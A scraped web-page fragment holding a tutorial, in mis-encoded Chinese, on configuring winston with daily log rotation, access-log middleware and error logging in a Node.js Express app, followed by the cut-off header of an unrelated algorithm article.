                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>winstonÂ æ˜¯ Node.js ç”Ÿæ€ä¸­æœ€æµè¡Œçš„æ—¥å¿—åº“ï¼Œé€šå¸¸é…åˆÂ winston-daily-rotate-fileÂ ä½¿ç”¨ï¼Œä»¥å®ç°<strong>æŒ‰å¤©åˆ‡å‰²æ—¥å¿—æ–‡ä»¶</strong>ï¼ˆé˜²æ­¢ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶æ— é™è†¨èƒ€åˆ°å‡ ä¸ªGBï¼‰ã€‚
æˆ‘ä»¬å°†å®ç°ä»¥ä¸‹ç›®æ ‡ï¼š</p>
<ol>
<li><strong>è®¿é—®æ—¥å¿—</strong>ï¼šè®°å½•æ‰€æœ‰ HTTP è¯·æ±‚ï¼ˆæ—¶é—´ã€IPã€URLã€Methodã€çŠ¶æ€ç ã€è€—æ—¶ï¼‰ã€‚</li>
<li><strong>é”™è¯¯æ—¥å¿—</strong>ï¼šè®°å½•æ‰€æœ‰çš„å¼‚å¸¸å’ŒæŠ¥é”™å †æ ˆã€‚</li>
<li><strong>æ—¥å¿—åˆ‡å‰²</strong>ï¼šæ¯å¤©è‡ªåŠ¨ç”Ÿæˆæ–°æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨æ¸…ç†æ—§æ—¥å¿—ï¼ˆå¦‚ä¿ç•™30å¤©ï¼‰ã€‚</li>
<li><strong>åˆ†ç¯å¢ƒå¤„ç†</strong>ï¼šå¼€å‘ç¯å¢ƒåœ¨æ§åˆ¶å°æ‰“å°å½©è‰²æ—¥å¿—ï¼Œç”Ÿäº§ç¯å¢ƒå†™å…¥æ–‡ä»¶ã€‚</li>
</ol>
<h3 data-id="heading-0">ç¬¬ä¸€æ­¥ï¼šå®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-js" lang="js">npm install winston winston-daily-rotate-file
</code></pre>
<h3 data-id="heading-1">ç¬¬äºŒæ­¥ï¼šå°è£… Logger å·¥å…·ç±» (src/utils/logger.js)</h3>
<p>æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå…¨å±€å•ä¾‹çš„ Logger å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> winston <span class="hljs-keyword">from</span> <span class="hljs-string">'winston'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'winston-daily-rotate-file'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>

<span class="hljs-comment">// å®šä¹‰æ—¥å¿—ç›®å½•</span>
<span class="hljs-keyword">const</span> logDir = <span class="hljs-string">'logs'</span>

<span class="hljs-comment">// å®šä¹‰æ—¥å¿—æ ¼å¼</span>
<span class="hljs-keyword">const</span> { combine, timestamp, printf, json, colorize } = winston.<span class="hljs-property">format</span>

<span class="hljs-comment">// è‡ªå®šä¹‰æ§åˆ¶å°æ‰“å°æ ¼å¼</span>
<span class="hljs-keyword">const</span> consoleFormat = <span class="hljs-title function_">printf</span>(<span class="hljs-function">(<span class="hljs-params">{ level, message, timestamp, ...metadata }</span>) =&gt;</span> {
  <span class="hljs-keyword">let</span> msg = <span class="hljs-string">`<span class="hljs-subst">${timestamp}</span> [<span class="hljs-subst">${level}</span>]: <span class="hljs-subst">${message}</span>`</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(metadata).<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    msg += <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(metadata)
  }
  <span class="hljs-keyword">return</span> msg
})

<span class="hljs-comment">// åˆ›å»º Logger å®ä¾‹</span>
<span class="hljs-keyword">const</span> logger = winston.<span class="hljs-title function_">createLogger</span>({
  <span class="hljs-attr">level</span>: <span class="hljs-string">'info'</span>, <span class="hljs-comment">// é»˜è®¤æ—¥å¿—çº§åˆ«</span>
  <span class="hljs-attr">format</span>: <span class="hljs-title function_">combine</span>(
    <span class="hljs-title function_">timestamp</span>({ <span class="hljs-attr">format</span>: <span class="hljs-string">'YYYY-MM-DD HH:mm:ss'</span> }),
    <span class="hljs-title function_">json</span>() <span class="hljs-comment">// æ–‡ä»¶ä¸­å­˜å‚¨ JSON æ ¼å¼ï¼Œæ–¹ä¾¿åç»­ç”¨ ELK ç­‰å·¥å…·åˆ†æ</span>
  ),
  <span class="hljs-attr">transports</span>: [
    <span class="hljs-comment">// 1. é”™è¯¯æ—¥å¿—ï¼šåªè®°å½• error çº§åˆ«çš„æ—¥å¿—</span>
    <span class="hljs-keyword">new</span> winston.<span class="hljs-property">transports</span>.<span class="hljs-title class_">DailyRotateFile</span>({
      <span class="hljs-attr">dirname</span>: path.<span class="hljs-title function_">join</span>(logDir, <span class="hljs-string">'error'</span>),
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'error-%DATE%.log'</span>,
      <span class="hljs-attr">datePattern</span>: <span class="hljs-string">'YYYY-MM-DD'</span>,
      <span class="hljs-attr">level</span>: <span class="hljs-string">'error'</span>,
      <span class="hljs-attr">zippedArchive</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å‹ç¼©æ—§æ—¥å¿—</span>
      <span class="hljs-attr">maxSize</span>: <span class="hljs-string">'20m'</span>,      <span class="hljs-comment">// å•ä¸ªæ–‡ä»¶æœ€å¤§ 20MB</span>
      <span class="hljs-attr">maxFiles</span>: <span class="hljs-string">'30d'</span>      <span class="hljs-comment">// ä¿ç•™ 30 å¤©</span>
    }),
    
    <span class="hljs-comment">// 2. ç»¼åˆæ—¥å¿—ï¼šè®°å½• info åŠä»¥ä¸Šçº§åˆ«çš„æ—¥å¿— (åŒ…å«è®¿é—®æ—¥å¿—)</span>
    <span class="hljs-keyword">new</span> winston.<span class="hljs-property">transports</span>.<span class="hljs-title class_">DailyRotateFile</span>({
      <span class="hljs-attr">dirname</span>: path.<span class="hljs-title function_">join</span>(logDir, <span class="hljs-string">'combined'</span>),
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'combined-%DATE%.log'</span>,
      <span class="hljs-attr">datePattern</span>: <span class="hljs-string">'YYYY-MM-DD'</span>,
      <span class="hljs-attr">zippedArchive</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">maxSize</span>: <span class="hljs-string">'20m'</span>,
      <span class="hljs-attr">maxFiles</span>: <span class="hljs-string">'30d'</span>
    })
  ]
})

<span class="hljs-comment">// å¦‚æœä¸æ˜¯ç”Ÿäº§ç¯å¢ƒï¼Œä¹Ÿåœ¨æ§åˆ¶å°æ‰“å°ï¼Œå¹¶å¼€å¯é¢œè‰²</span>
<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> !== <span class="hljs-string">'production'</span>) {
  logger.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> winston.<span class="hljs-property">transports</span>.<span class="hljs-title class_">Console</span>({
    <span class="hljs-attr">format</span>: <span class="hljs-title function_">combine</span>(
      <span class="hljs-title function_">colorize</span>(),
      <span class="hljs-title function_">timestamp</span>({ <span class="hljs-attr">format</span>: <span class="hljs-string">'YYYY-MM-DD HH:mm:ss'</span> }),
      consoleFormat
    )
  }))
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> logger
</code></pre>
<h3 data-id="heading-2">ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ HTTP è®¿é—®æ—¥å¿—ä¸­é—´ä»¶ (src/middleware/httpLogger.js)</h3>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¸­é—´ä»¶ï¼Œåƒä¿å®‰ä¸€æ ·ï¼Œè®°å½•è¿›å‡ºçš„æ¯ä¸€ä¸ªè¯·æ±‚ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> logger <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/logger.js'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">httpLogger</span> = (<span class="hljs-params">req, res, next</span>) =&gt; {
  <span class="hljs-comment">// 1. è®°å½•è¯·æ±‚å¼€å§‹æ—¶é—´</span>
  <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()

  <span class="hljs-comment">// 2. ç›‘å¬å“åº”å®Œæˆäº‹ä»¶ (finish)</span>
  res.<span class="hljs-title function_">on</span>(<span class="hljs-string">'finish'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// è®¡ç®—è€—æ—¶</span>
    <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start
    
    <span class="hljs-comment">// è·å– IP (å…¼å®¹ Nginx ä»£ç†)</span>
    <span class="hljs-keyword">const</span> ip = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-forwarded-for'</span>] || req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>
    
    <span class="hljs-comment">// ç»„è£…æ—¥å¿—ä¿¡æ¯</span>
    <span class="hljs-keyword">const</span> logInfo = {
      <span class="hljs-attr">method</span>: req.<span class="hljs-property">method</span>,
      <span class="hljs-attr">url</span>: req.<span class="hljs-property">originalUrl</span>,
      <span class="hljs-attr">status</span>: res.<span class="hljs-property">statusCode</span>,
      <span class="hljs-attr">duration</span>: <span class="hljs-string">`<span class="hljs-subst">${duration}</span>ms`</span>,
      <span class="hljs-attr">ip</span>: ip,
      <span class="hljs-attr">userAgent</span>: req.<span class="hljs-property">headers</span>[<span class="hljs-string">'user-agent'</span>] || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">// æ ¹æ®çŠ¶æ€ç å†³å®šæ—¥å¿—çº§åˆ«</span>
    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">statusCode</span> &gt;= <span class="hljs-number">500</span>) {
      logger.<span class="hljs-title function_">error</span>(<span class="hljs-string">'HTTP Request Error'</span>, logInfo)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.<span class="hljs-property">statusCode</span> &gt;= <span class="hljs-number">400</span>) {
      logger.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'HTTP Client Error'</span>, logInfo)
    } <span class="hljs-keyword">else</span> {
      logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">'HTTP Access'</span>, logInfo)
    }
  })

  <span class="hljs-title function_">next</span>()
}
</code></pre>
<h3 data-id="heading-3">ç¬¬å››æ­¥ï¼šé›†æˆåˆ°å…¥å£æ–‡ä»¶ (app.js)</h3>
<p>æˆ‘ä»¬éœ€è¦æŠŠÂ httpLoggerÂ æ”¾åœ¨æ‰€æœ‰è·¯ç”±çš„<strong>æœ€å‰é¢</strong>ï¼ŒæŠŠé”™è¯¯è®°å½•æ”¾åœ¨æ‰€æœ‰è·¯ç”±çš„<strong>æœ€åé¢</strong>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">'express'</span>
<span class="hljs-keyword">import</span> logger <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/logger.js'</span>         <span class="hljs-comment">// å¼•å…¥ logger</span>
<span class="hljs-keyword">import</span> { httpLogger } <span class="hljs-keyword">from</span> <span class="hljs-string">'./middleware/httpLogger.js'</span> <span class="hljs-comment">// å¼•å…¥ä¸­é—´ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">HttpError</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/HttpError.js'</span>

<span class="hljs-comment">// ... å…¶ä»–å¼•å…¥ (helmet, cors ç­‰)</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()

<span class="hljs-comment">// ==========================================</span>
<span class="hljs-comment">// 1. æŒ‚è½½è®¿é—®æ—¥å¿—ä¸­é—´ä»¶ (å¿…é¡»æ”¾åœ¨æœ€å‰é¢)</span>
<span class="hljs-comment">// ==========================================</span>
app.<span class="hljs-title function_">use</span>(httpLogger)

<span class="hljs-comment">// ... å…¶ä»–ä¸­é—´ä»¶ (json, cors, helmet) ...</span>

<span class="hljs-comment">// ... ä½ çš„è·¯ç”± (routes) ...</span>
<span class="hljs-comment">// app.use('/api/admin', adminRouter)</span>
<span class="hljs-comment">// app.use('/api/app', appRouter)</span>


<span class="hljs-comment">// ==========================================</span>
<span class="hljs-comment">// 2. å…¨å±€é”™è¯¯å¤„ç†ä¸­é—´ä»¶ (å¿…é¡»æ”¾åœ¨æœ€å)</span>
<span class="hljs-comment">// ==========================================</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// è®°å½•é”™è¯¯æ—¥å¿—åˆ°æ–‡ä»¶</span>
  logger.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">message</span>, {
    <span class="hljs-attr">stack</span>: err.<span class="hljs-property">stack</span>, <span class="hljs-comment">// è®°å½•å †æ ˆä¿¡æ¯ï¼Œæ–¹ä¾¿æ’æŸ¥ Bug</span>
    <span class="hljs-attr">url</span>: req.<span class="hljs-property">originalUrl</span>,
    <span class="hljs-attr">method</span>: req.<span class="hljs-property">method</span>,
    <span class="hljs-attr">ip</span>: req.<span class="hljs-property">ip</span>
  })

  <span class="hljs-comment">// å¦‚æœæ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ HttpErrorï¼Œè¿”å›å¯¹åº”çš„çŠ¶æ€ç </span>
  <span class="hljs-keyword">if</span> (err <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">HttpError</span>) {
    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(err.<span class="hljs-property">code</span>).<span class="hljs-title function_">json</span>({
      <span class="hljs-attr">code</span>: err.<span class="hljs-property">code</span>,
      <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span>
    })
  }

  <span class="hljs-comment">// å…¶å®ƒæœªçŸ¥é”™è¯¯ï¼Œç»Ÿä¸€æŠ¥ 500</span>
  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({
    <span class="hljs-attr">code</span>: <span class="hljs-number">500</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">'æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œè¯·è”ç³»ç®¡ç†å‘˜'</span>
  })
})

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>
app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> {
  logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">`Server is running on port <span class="hljs-subst">${PORT}</span>`</span>) <span class="hljs-comment">// ä½¿ç”¨ logger æ‰“å°å¯åŠ¨ä¿¡æ¯</span>
})
</code></pre>
<h3 data-id="heading-4">ç¬¬äº”æ­¥ï¼šæ•ˆæœæ¼”ç¤º</h3>
<h4 data-id="heading-5">1. å¯åŠ¨é¡¹ç›®</h4>
<pre><code class="hljs language-js" lang="js">nodemon app.<span class="hljs-property">js</span>
</code></pre>
<p>ä¼šå‘ç°é¡¹ç›®æ ¹ç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªÂ logsÂ æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰Â combinedÂ å’ŒÂ errorÂ ä¸¤ä¸ªå­æ–‡ä»¶å¤¹ã€‚</p>
<h4 data-id="heading-6">2. å‘èµ·ä¸€ä¸ªæ­£å¸¸è¯·æ±‚ (GET /api/app/product/list)</h4>
<ul>
<li><strong>æ§åˆ¶å°</strong>ï¼šæ˜¾ç¤ºç»¿è‰²çš„æ—¥å¿—Â [info]: HTTP Access {"method":"GET", "status": 200 ...}</li>
<li><strong>æ–‡ä»¶</strong>Â (logs/combined/combined-2023-xx-xx.log)ï¼šå†™å…¥äº†ä¸€è¡Œ JSON è®°å½•ã€‚</li>
</ul>
<h4 data-id="heading-7">3. å‘èµ·ä¸€ä¸ªé”™è¯¯è¯·æ±‚ (å¯†ç é”™è¯¯ 400 æˆ– ä»£ç æŠ¥é”™ 500)</h4>
<ul>
<li><strong>æ–‡ä»¶</strong>Â (logs/error/error-2023-xx-xx.log)ï¼šä¼šè‡ªåŠ¨è®°å½•ä¸‹è¯¦ç»†çš„é”™è¯¯å †æ ˆÂ stackï¼Œè¿™å¯¹äºæ’æŸ¥çº¿ä¸Šé—®é¢˜è‡³å…³é‡è¦ï¼Œä½ å†ä¹Ÿä¸ç”¨ç›¯ç€é»‘ä¹ä¹çš„æ§åˆ¶å°æˆ–è€…çŒœæµ‹æŠ¥é”™åŸå› äº†ã€‚</li>
</ul>
<h3 data-id="heading-8">æ€»ç»“</h3>
<p>é€šè¿‡å¼•å…¥Â winstonï¼š</p>
<ol>
<li><strong>è‡ªåŠ¨åŒ–</strong>ï¼šæ—¥å¿—è‡ªåŠ¨æŒ‰å¤©åˆ†å‰²ï¼Œè‡ªåŠ¨å‹ç¼©ï¼Œä¸ç”¨æ‹…å¿ƒç£ç›˜å†™æ»¡ã€‚</li>
<li><strong>ç»“æ„åŒ–</strong>ï¼šæ—¥å¿—ä»¥ JSON æ ¼å¼å­˜å‚¨ï¼Œæ–¹ä¾¿ä»¥åæ¥å…¥ ELK (Elasticsearch, Logstash, Kibana) åšå¯è§†åŒ–ç›‘æ§ã€‚</li>
<li><strong>å¯è¿½æº¯</strong>ï¼šä»»ä½•æŠ¥é”™éƒ½æœ‰æ—¶é—´ã€å †æ ˆå’Œè¯·æ±‚å‚æ•°ï¼Œè¿ç»´å’Œæ’æŸ¥æ•ˆç‡æå‡ 10 å€ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[â€œæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²â€ï¼šä»O(nÂ²)å“ˆå¸Œä¼˜åŒ–åˆ°æ»‘åŠ¨çª—å£å°ç¥ï¼Œå†åˆ°DPé™ç»´æ‰“å‡»ï¼]]></title>    <link>https://juejin.cn/post/7583707681003520046</link>    <guid>https://juejin.cn/post/7583707681003520046</guid>    <pubDate>2025-12-15T09:30:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583707681003520046" data-draft-id="7583707681003405358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="â€œæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²â€ï¼šä»O(nÂ²)å“ˆå¸Œä¼˜åŒ–åˆ°æ»‘åŠ¨çª—å£å°ç¥ï¼Œå†åˆ°DPé™ç»´æ‰“å‡»ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,ç®—æ³•,JavaScript"/> <meta itemprop="datePublished" content="2025-12-15T09:30:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ €ç§‹666"/> <meta itemprop="url" content="https://juejin.cn/user/2566698322650307"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            â€œæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²â€ï¼šä»O(nÂ²)å“ˆå¸Œä¼˜åŒ–åˆ°æ»‘åŠ¨çª—å£å°ç¥ï¼Œå†åˆ°DPé™ç»´æ‰“å‡»ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2566698322650307/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ €ç§‹666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:30:06.000Z" title="Mon Dec 15 2025 09:30:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFN